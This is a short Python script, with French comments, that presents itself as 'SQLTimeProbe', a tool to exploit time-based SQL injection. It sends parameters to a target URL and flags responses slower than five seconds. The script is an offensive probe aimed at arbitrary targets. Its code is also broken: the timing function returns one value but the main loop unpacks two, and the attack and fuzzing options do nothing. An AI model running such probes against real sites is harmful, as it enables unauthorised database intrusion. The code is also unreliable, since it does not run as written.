import requests
import time
import argparse

# Fonction pour exécuter la requête SQL et mesurer le temps de réponse
def execute_sql_query(url, params):
    start_time = time.time()
    response = requests.get(url, params={'test': params})
    end_time = time.time()
    return end_time - start_time

# Fonction pour vérifier si une requête prend plus de 5 secondes
def check_response_time(response_time):
    if response_time > 5:
        return True
    else:
        return False

def verify(url, params):
    response_time=execute_sql_query(url, params)
    return check_response_time(response_time)

# ASCII art
ascii_art = """\033[91m
███████╗ ██████╗ ██╗  ████████╗██╗███╗   ███╗███████╗██████╗ ██████╗  ██████╗ ██████╗ ███████╗
██╔════╝██╔═══██╗██║  ╚══██╔══╝██║████╗ ████║██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔════╝
███████╗██║   ██║██║     ██║   ██║██╔████╔██║█████╗  ██████╔╝██████╔╝██║   ██║██████╔╝█████╗  
╚════██║██║▄▄ ██║██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ ██╔══██╗██║   ██║██╔══██╗██╔══╝  
███████║╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║███████╗██║     ██║  ██║╚██████╔╝██████╔╝███████╗
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝
    \033[0m                                                                                          
"""

print(ascii_art)

# Analyse des arguments de la ligne de commande
parser = argparse.ArgumentParser(description="SQLTimeProbe : script to exploit Time-Based SQL Injection")
parser.add_argument("-i", "--interactive", action="store_true", help="Mode interactif")
parser.add_argument("-u", "--url", help="URL de la cible")
parser.add_argument("-p", "--params", help="Paramètres de la requête (au format 'test=1&test=2&test=3') (avec $FUZZ$ pour le fuzzing)")
parser.add_argument("-a", "--attack", action="store_true", help="Attaque à effectuer")
parser.add_argument("-v", "--verify", action="store_true", help="Vérification de l'injection SQL Time-Based")
args = parser.parse_args()


# Si mode interactif est activé
if args.interactive:
    url = input("Entrez l'URL de la cible : ")
    params = input("Entrez vos paramètres de la rêquete (au format 'test=1&test=2&test=3') (avec $FUZZ$ pour le fuzzing) :")
# Si l'utilisateur fournit l'URL et la requête en ligne de commande
elif args.url and args.params:
    url = args.url
    params = args.params.split(",") if args.params else []
    if args.verify:
        print('[-] Vérification de l\'injection SQL Time-Based')
else:
    print("Veuillez utiliser -i pour le mode interactif ou -u pour l'URL et -p pour les paramètres.")
    exit()

# Vérification de l'URL
if not url:
    print("Veuillez spécifier l'URL de la cible.")
    exit()

# Liste pour stocker les temps de réponse
response_times = []

num_queries = 5

# Effectuer les requêtes et mesurer les temps de réponse
for _ in range(num_queries):
    response, exec_time = execute_sql_query(url, params)
    response_times.append((response, exec_time))

# Trier les résultats en fonction du temps de réponse
response_times.sort(key=lambda x: x[1])

# Afficher les résultats triés
for i, (response, exec_time) in enumerate(response_times):
    print(f"Requête {i+1}: Temps de réponse {exec_time} secondes")
    print(response.text)